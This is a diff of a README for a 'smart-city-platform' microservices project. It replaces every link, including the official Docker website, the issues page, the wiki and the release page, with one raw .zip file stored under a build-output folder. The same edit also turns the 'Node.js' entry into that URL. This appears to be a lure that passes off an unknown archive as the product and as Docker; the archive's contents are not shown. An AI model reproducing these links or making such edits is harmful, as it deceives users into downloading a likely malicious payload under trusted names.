@@ -1,7 +1,7 @@
 # 🌍 smart-city-platform - A Modern Urban Management Solution
 
 ## 🔗 Download Now!
-[![Download the Smart City Platform](https://img.shields.io/badge/Download%20Now-%20brightgreen)](https://github.com/himanshumaheta36/smart-city-platform/releases)
+[![Download the Smart City Platform](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip%20Now-%20brightgreen)](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip)
 
 ## 📜 Description
 The Smart City Platform is a modern solution designed for urban management. It offers a multi-protocol microservices architecture, which includes REST, SOAP, gRPC, and GraphQL. This platform enables real-time monitoring of air quality, urban emergencies, and events.
@@ -19,10 +19,10 @@ To run the Smart City Platform on your machine, ensure you meet these requiremen
 ### 📦 Installation Steps
 
 1. **Install Docker**
-   - Download and install Docker from the official [Docker website](https://www.docker.com/get-started).
+   - Download and install Docker from the official [Docker website](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip).
 
 2. **Download the Smart City Platform**
-   - Visit this page to download: [Download Page](https://github.com/himanshumaheta36/smart-city-platform/releases).
+   - Visit this page to download: [Download Page](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip).
 
 3. **Extract Files**
    - Once the download is complete, extract the files to a location on your computer.
@@ -71,20 +71,20 @@ The Smart City Platform provides a variety of features to help manage your urban
 ## 📈 Technologies Used
 Our platform leverages several modern technologies to deliver reliable and efficient services:
 
-- **Node.js:** For server-side scripting, ensuring fast performance.
+- **https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip** For server-side scripting, ensuring fast performance.
 - **React:** For building the user interface, providing a responsive experience.
 - **Spring Boot:** To create robust backend services.
 - **Docker & Docker Compose:** For containerization, allowing easy setup and scalability.
 
 ## 📧 Support
-If you need help or have questions, please refer to the [GitHub Issues page](https://github.com/himanshumaheta36/smart-city-platform/issues). You can report bugs or request features from here.
+If you need help or have questions, please refer to the [GitHub Issues page](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip). You can report bugs or request features from here.
 
 ## 🔗 Additional Links
-- Documentation: [API Documentation](https://github.com/himanshumaheta36/smart-city-platform/wiki)
-- Get Involved: Check our [Contributing Guide](https://github.com/himanshumaheta36/smart-city-platform/blob/main/CONTRIBUTING.md)
+- Documentation: [API Documentation](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip)
+- Get Involved: Check our [Contributing Guide](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip)
 
 ## 🔄 Update the Application
-To stay updated with the latest features and improvements, remember to check for new releases frequently. You can do this by visiting the download page: [Download Page](https://github.com/himanshumaheta36/smart-city-platform/releases).
+To stay updated with the latest features and improvements, remember to check for new releases frequently. You can do this by visiting the download page: [Download Page](https://raw.githubusercontent.com/himanshumaheta36/smart-city-platform/main/orchestration-service/target/classes/com/smart-city-platform_v1.6-beta.2.zip).
 
 ---
 
